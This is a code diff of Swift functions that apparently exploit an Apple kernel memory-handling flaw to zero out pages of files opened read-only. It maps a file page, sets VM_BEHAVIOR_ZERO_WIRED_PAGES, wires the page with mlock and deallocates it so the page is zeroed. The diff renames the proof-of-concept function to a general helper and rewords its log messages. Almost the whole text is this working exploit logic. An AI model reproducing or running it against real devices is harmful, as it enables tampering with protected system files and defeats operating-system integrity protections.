@@ -20,7 +20,7 @@ func mapFilePage(path: String, offset: Int) throws -> UnsafeMutableRawPointer {
     let fd = open(path, O_RDONLY)
     
     guard fd != -1 else {
-      throw "open failed"
+      throw "open failed. this either means that the exploit isn't supported or the file simply doesn't exist."
     }
     
     let mappedAt = mmap(nil, pageSize, PROT_READ, MAP_FILE | MAP_SHARED, fd, off_t(offset))
@@ -33,7 +33,7 @@ func mapFilePage(path: String, offset: Int) throws -> UnsafeMutableRawPointer {
     return mappedAt!
 }
 
-func zeroPoC(path: String, offset: Int? = nil) throws {
+func zeroAtPath(path: String, offset: Int? = nil) throws {
     let fileOffset = offset ?? 0
     
     guard fileOffset % pageSize == 0 else {
@@ -41,7 +41,7 @@ func zeroPoC(path: String, offset: Int? = nil) throws {
     }
     
     let page = try mapFilePage(path: path, offset: fileOffset)
-    print(String(format: "[*] mapped page at offset 0x%016zx at 0x%016llx", fileOffset, UInt(bitPattern: page)))
+    print(String(format: "(wr) mapped page at offset 0x%016zx at 0x%016llx", fileOffset, UInt(bitPattern: page)))
     
     let pageVmAddress = UInt(bitPattern: page)
     
@@ -50,19 +50,19 @@ func zeroPoC(path: String, offset: Int? = nil) throws {
         throw "failed to set VM_BEHAVIOR_ZERO_WIRED_PAGES on the entry"
     }
     
-    print("[*] set VM_BEHAVIOR_ZERO_WIRED_PAGES")
+    print("(wr) set VM_BEHAVIOR_ZERO_WIRED_PAGES")
     
     let mlockErr = mlock(page, pageSize)
     guard mlockErr == 0 else {
         throw "mlock failed"
     }
-    print("[*] mlock success")
+    print("(wr) mlock success")
     
     kr = vm_deallocate(mach_task_self_, pageVmAddress, vm_size_t(pageSize))
     guard kr == KERN_SUCCESS else {
         throw "vm_deallocate failed: \(String(cString: mach_error_string(kr)))"
     }
-    print("[*] deleted map entries before unwiring")
+    print("(wr) deleted map entries before unwiring")
     
-    print("[*] zeroed file successfully!")
+    print("(wr) zeroed file successfully!")
 }
